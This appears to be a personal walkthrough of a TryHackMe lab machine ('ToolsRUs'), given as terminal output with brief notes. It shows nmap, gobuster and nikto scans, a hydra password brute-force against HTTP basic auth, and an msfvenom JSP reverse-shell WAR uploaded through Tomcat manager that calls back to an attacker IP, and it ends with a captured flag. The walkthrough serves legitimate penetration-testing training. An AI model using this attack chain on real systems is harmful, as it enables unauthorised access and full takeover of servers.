kali@kali:~/oscptraining/tryhackme/toolsrus$ nmap -sV -sC -o nmap 10.10.141.158
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 23:55 EDT
Nmap scan report for 10.10.141.158
Host is up (0.33s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:d9:8f:7a:22:06:90:8f:8e:25:96:08:a2:31:79:89 (RSA)
|   256 b5:a4:e1:b5:73:e0:a4:87:8a:4a:1b:0e:c1:1f:04:46 (ECDSA)
|_  256 aa:18:05:5c:26:1e:46:3f:0e:34:67:a6:7d:6a:59:fa (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.23 seconds

gobuster dir -u 10.10.141.158  -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

gobuster dir -e -u http://10.10.141.158/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 

http://10.10.141.158/guidelines (Status: 301)

the following site has a basic authentication in place, i guess we need to use hydra 
10.10.141.158/protected

ali@kali:~/oscptraining/tryhackme/toolsrus$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.141.158 http-get /protected/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-24 01:07:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.141.158:80/protected/
[80][http-get] host: 10.10.141.158   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-24 01:07:30

bob;bubbles
we are able to get into the site but it says the page has been moved to a different port
lets try to use nikto (it took a really long time though)

kali@kali:~/oscptraining/tryhackme/toolsrus$ nikto -h 10.10.141.158:1234
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.141.158
+ Target Hostname:    10.10.141.158
+ Target Port:        1234
+ Start Time:         2020-10-24 01:18:34 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 8195 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-10-24 02:12:32 (GMT-4) (3238 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

lets try to scan manager/html


going onto http://10.10.141.158:1234/manager/html
it seems that we are able to upload some files to create a reverse shell

created a payload to upload to the site
kali@kali:~/oscptraining/tryhackme/toolsrus$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.102.117 LPORT=4444 -f war > toolsrus.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes

uploaded it, set up a listener
nc -lvnp 4444

access this
http://10.10.141.158:1234/toolsrus/

and tada we are in, surprised we got root access though

set up the shell with this! (optional)
$ python -c 'import pty; pty.spawn("/bin/bash")'

ff1fc4a81affcc7688cf89ae7dc6e0e1


